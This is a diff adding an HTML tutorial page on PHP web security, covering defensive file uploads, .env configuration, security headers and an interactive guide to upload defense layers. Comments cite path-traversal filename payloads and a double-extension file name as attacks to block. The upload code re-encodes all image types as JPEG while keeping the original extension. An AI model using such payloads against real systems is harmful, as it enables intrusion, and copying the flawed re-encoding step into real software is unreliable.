+                $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+                if ($extension !== $allowedTypes[$mimeType]) {
+        throw new \RuntimeException("File extension does not match its content type.");
+    }
+
+                // 5. Generate a safe random filename — NEVER use the original filename!
+                // Original names can contain path traversal: "../../config/database.php"
+                $safeFilename = bin2hex(random_bytes(16)) . '.' . $extension;
+                // e.g., "a3f2c8d1b4e9f0a6c2d3e4f5a6b7c8d9.jpg"
+
+                // 6. Ensure upload directory exists and is outside web root if possible
+                if (!is_dir($uploadDir)) {
+                    mkdir($uploadDir, 0755, true);
+    }
+
+                $destination = rtrim($uploadDir, '/') . '/' . $safeFilename;
+
+                // 7. Move file (use move_uploaded_file — it validates the file came from PHP upload)
+                if (!move_uploaded_file($file['tmp_name'], $destination)) {
+        throw new \RuntimeException("Failed to save uploaded file.");
+    }
+
+                // 8. For images — re-encode to strip any embedded malicious content (e.g., PHP in EXIF)
+                if (in_array($mimeType, ['image/jpeg', 'image/png', 'image/gif', 'image/webp'])) {
+                    $image = imagecreatefromstring(file_get_contents($destination));
+                if ($image !== false) {
+                    imagejpeg($image, $destination, 90);  // Re-encode, stripping all metadata
+                imagedestroy($image);
+        }
+    }
+
+                return $safeFilename;
+}
+
+                // Usage in form handler
+                if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
+    try {
+                    $filename = handleSecureUpload($_FILES['avatar'], '/var/www/uploads/');
+                echo "File uploaded: $filename";
+    } catch (\RuntimeException $e) {
+                    echo "Upload failed: " . $e->getMessage();
+    }
+}
+?>
+                ```
+
+                ---
+
+                #### 11. Environment Variables & Configuration
+
+                Never hardcode credentials. Use `.env` files:
+
+                ```php
+                <?php
+                // .env file (NEVER commit to git — add to .gitignore!)
+                // APP_ENV=production
+                // DB_HOST=127.0.0.1
+                // DB_DATABASE=myapp_production
+                // DB_USERNAME=myapp_user
+                // DB_PASSWORD=SuperSecretPassword123!
+                // APP_KEY=base64:aBcDeFgHiJkLmNoPqRsTuVwXyZ==
+
+                // Loading .env with vlucas/phpdotenv (composer require vlucas/phpdotenv)
+                require 'vendor/autoload.php';
+
+                $dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
+$dotenv->load();
+
+// Required variables — throws if missing
+$dotenv->required(['DB_HOST', 'DB_DATABASE', 'DB_USERNAME', 'DB_PASSWORD', 'APP_KEY']);
+$dotenv->required('APP_ENV')->allowedValues(['local', 'staging', 'production']);
+
+                // Accessing environment variables
+                $dbHost   = $_ENV['DB_HOST'];
+                $dbName   = $_ENV['DB_DATABASE'];
+                $appKey   = getenv('APP_KEY');  // Alternative using getenv()
+
+                // Config array pattern (better than scattered getenv() calls)
+                return [
+    'database' => [
+        'driver'   => $_ENV['DB_DRIVER']   ?? 'mysql',
+        'host'     => $_ENV['DB_HOST']     ?? '127.0.0.1',
+        'port'     => (int) ($_ENV['DB_PORT'] ?? 3306),
+        'database' => $_ENV['DB_DATABASE'] ?? 'myapp',
+        'username' => $_ENV['DB_USERNAME'] ?? 'root',
+        'password' => $_ENV['DB_PASSWORD'] ?? '',
+        'charset'  => 'utf8mb4',
+                ],
+    'app' => [
+        'env'   => $_ENV['APP_ENV'] ?? 'local',
+        'debug' => filter_var($_ENV['APP_DEBUG'] ?? 'false', FILTER_VALIDATE_BOOLEAN),
+        'key'   => $_ENV['APP_KEY'] ?? '',
+        'url'   => $_ENV['APP_URL'] ?? 'http://localhost',
+                ],
+                ];
+?>
+                ```
+
+                ---
+
+                #### 12. Security Headers Checklist
+
+                ```php
+                <?php
+                // Send all security headers BEFORE any output
+
+                // Prevents MIME type sniffing
+                header('X-Content-Type-Options: nosniff');
+
+                // Clickjacking protection
+                header('X-Frame-Options: SAMEORIGIN');
+
+                // XSS filter (legacy browsers)
+                header('X-XSS-Protection: 1; mode=block');
+
+                // Referrer policy
+                header('Referrer-Policy: strict-origin-when-cross-origin');
+
+                // HSTS — force HTTPS for 1 year (only set on HTTPS!)
+                header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
+
+                // Content Security Policy — most powerful XSS defense
+                header("Content-Security-Policy: default-src 'self'; " .
+                "script-src 'self' https://cdn.jsdelivr.net; " .
+                "style-src 'self' 'unsafe-inline'; " .
+                "img-src 'self' data: https:; " .
+                "font-src 'self' https://fonts.gstatic.com; " .
+                "connect-src 'self'; " .
+                "frame-ancestors 'none';");
+
+                // Permissions Policy — disable dangerous browser features
+                header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
+
+                // Remove PHP version from headers (security through obscurity)
+                header_remove('X-Powered-By');
+                ini_set('expose_php', '0');
+?>
+                ```
+
+                ---
+
+                #### Summary — Security Checklist
+
+                | Vulnerability | Attack | PHP Defense |
+                | :--- | :--- | :--- |
+                | **SQL Injection** | Malicious SQL in input | Prepared statements with PDO |
+                | **XSS** | Script injection in HTML | `htmlspecialchars()` on all output |
+                | **CSRF** | Fake form submissions | CSRF token in forms + `hash_equals()` |
+                | **Session Fixation** | Known session ID attack | `session_regenerate_id(true)` on login |
+                | **Session Hijacking** | Stolen session cookie | Fingerprint check + idle timeout |
+                | **Brute Force** | Repeated login attempts | Rate limiting + account lockout |
+                | **File Upload** | Malicious file execution | MIME check + random filename + GD re-encode |
+                | **Weak Passwords** | Dictionary attacks | `password_hash(PASSWORD_ARGON2ID)` |
+                | **Credential Leaks** | Hardcoded DB passwords | `.env` files + `vlucas/phpdotenv` |
+                | **Timing Attacks** | Response time analysis | `hash_equals()` + `password_verify()` |
+            
+    </textarea>
+
+    <!-- Markdown Engine & Interactive Scripts -->
+    <script>
+        // 1. Markdown Parsing & Copy Code Buttons
+        document.addEventListener('DOMContentLoaded', () => {
+            const rawContent = document.getElementById('markdown-content').value;
+            document.getElementById('content').innerHTML = marked.parse(rawContent);
+
+            // Add Copy buttons to all pre code blocks
+            document.querySelectorAll('pre').forEach((pre) => {
+                const wrapper = document.createElement('div');
+                wrapper.className = 'code-wrapper';
+                pre.parentNode.insertBefore(wrapper, pre);
+                wrapper.appendChild(pre);
+
+                const copyBtn = document.createElement('button');
+                copyBtn.className = 'copy-btn';
+                copyBtn.innerText = 'Copy';
+                copyBtn.onclick = () => {
+                    navigator.clipboard.writeText(pre.innerText).then(() => {
+                        copyBtn.innerText = 'Copied!';
+                        copyBtn.classList.add('copied');
+                        setTimeout(() => {
+                            copyBtn.innerText = 'Copy';
+                            copyBtn.classList.remove('copied');
+                        }, 2000);
+                    });
+                };
+                wrapper.appendChild(copyBtn);
+            });
+
+            // Initialize Upload Step 0
+            showUploadStep(0);
+        });
+
+        // 2. Interactive Upload Steps Data
+        const uploadSteps = [
+            {
+                title: "1. Upload Error & File Size Guard",
+                level: "DEFENSE LAYER 1",
+                desc: "Check $_FILES['upload']['error'] === UPLOAD_ERR_OK and enforce strict byte limits (e.g., 5MB max) to prevent server disk space exhaustion attacks.",
+                code: "if ($file['error'] !== UPLOAD_ERR_OK) {\n    throw new RuntimeException('Upload error: ' . $file['error']);\n}\nif ($file['size'] > 5 * 1024 * 1024) {\n    throw new RuntimeException('File exceeds 5MB size limit.');\n}"
+            },
+            {
+                title: "2. Binary MIME Sniffing via finfo (Never Trust $_FILES['type'])",
+                level: "DEFENSE LAYER 2",
+                desc: "$_FILES['type'] is a client-controlled HTTP header easily faked by hackers. Always read the real binary magic bytes using PHP's Fileinfo extension.",
+                code: "$finfo = new finfo(FILEINFO_MIME_TYPE);\n$mimeType = $finfo->file($file['tmp_name']);\n// Reads binary magic bytes: Returns 'image/jpeg', 'application/pdf', etc."
+            },
+            {
+                title: "3. Strict Extension to MIME Whitelist Matching",
+                level: "DEFENSE LAYER 3",
+                desc: "Verify that the real MIME type is on the whitelist AND that the file extension strictly corresponds to that MIME type, preventing polyglot files (e.g. avatar.php.jpg).",
+                code: "$allowed = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'application/pdf' => 'pdf'];\nif (!array_key_exists($mimeType, $allowed)) {\n    throw new RuntimeException('Forbidden MIME type: ' . $mimeType);\n}\n$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));\nif ($ext !== $allowed[$mimeType]) { throw new RuntimeException('Extension mismatch!'); }"
+            },
+            {
+                title: "4. Cryptographically Secure Random Filename",
+                level: "DEFENSE LAYER 4",
+                desc: "NEVER use original filenames! They can contain Path Traversal payloads like '../../index.php' or null-bytes. Generate a 32-character random hex string.",
+                code: "$safeFilename = bin2hex(random_bytes(16)) . '.' . $allowed[$mimeType];\n// Result: '7a9c8b1d4e2f3a6c5b8e9d0a1b2c3d4e.jpg' (Zero path traversal risk!)"
+            },
+            {
+                title: "5. Safe Movement via move_uploaded_file()",
+                level: "DEFENSE LAYER 5",
+                desc: "Always use move_uploaded_file() instead of rename() or copy(). It verifies that the file was actually uploaded via HTTP POST to prevent local file inclusion.",
+                code: "$destination = '/var/www/uploads/' . $safeFilename;\nif (!move_uploaded_file($file['tmp_name'], $destination)) {\n    throw new RuntimeException('Failed to move uploaded file.');\n}"
+            },
+            {
+                title: "6. GD Image Re-Encoding (Anti-EXIF PHP Payload Neutralizer)",
+                level: "DEFENSE LAYER 6",
+                desc: "Attackers can hide malicious PHP code inside an image's EXIF metadata. Re-encoding the image with GD library strips all metadata, neutralizing embedded scripts.",
+                code: "$image = imagecreatefromstring(file_get_contents($destination));\nif ($image !== false) {\n    imagejpeg($image, $destination, 90); // Re-encodes pixels, stripping all EXIF!\n    imagedestroy($image);\n}"
+            }
+        ];
+
+        function showUploadStep(index) {
+            const chips = document.querySelectorAll('#uploadNav .step-chip');
+            chips.forEach((c, idx) => {
+                c.classList.toggle('active', idx === index);
+            });
+
+            const step = uploadSteps[index];
+            const contentBox = document.getElementById('uploadContent');
+            contentBox.innerHTML = 
+                '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">' +
+                    '<h5 style="margin:0;">' + step.title + '</h5>' +
+                    '<span class="badge badge-security">' + step.level + '</span>' +
+                '</div>' +
+                '<p style="color:var(--slate-700); font-size:0.95rem; margin-bottom:12px;">' + step.desc + '</p>' +
+                '<pre style="margin:0;"><code class="language-php">' + step.code + '</code></pre>';
+        }
+
+        // 3. Tab Switcher
+        function switchSecTab(evt, tabId) {
+            document.querySelectorAll('.tab-container .tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-container .tab-panel').forEach(panel => panel.classList.remove('active'));
+
+            evt.currentTarget.classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        }
+    </script>
+</body>
+</html>
